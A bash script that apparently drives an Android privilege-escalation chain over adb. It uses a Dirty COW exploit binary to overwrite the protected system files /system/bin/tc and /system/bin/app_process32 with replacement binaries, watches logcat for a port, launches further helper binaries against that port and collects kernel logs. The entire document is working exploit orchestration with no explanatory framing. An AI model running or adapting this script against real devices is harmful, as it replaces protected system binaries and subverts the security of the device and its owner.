#!/bin/bash
dyc() {
    adb shell cp -v /system/bin/$1 /data/local/tmp/${1}old
    adb shell /data/local/tmp/dirtycow /system/bin/$1 /data/local/tmp/$2
}
adb wait-for-device
dyc tc tcfix

port=""
while [[ -z "$port" ]]; do
    dyc app_process32 appspawn 

    (
    adb shell logcat fixtc:* *:S >loggy & catpid=$!
    tail --pid=$catpid -f loggy | { sed '/port/ q' && kill -9 $catpid; }
    sleep 1
    ) &>/dev/null 
    port=$(cat loggy | grep -Poa "(?<=port )[0-9]+(?=.*)")

done

echo "Running on port $port"
adb shell /data/local/tmp/serv_fork 5000 &
adb shell /data/local/tmp/pppp $port

adb wait-for-device
adb shell cat /data/dontpanic/last_kmsg >kmsg_result

echo "Done"
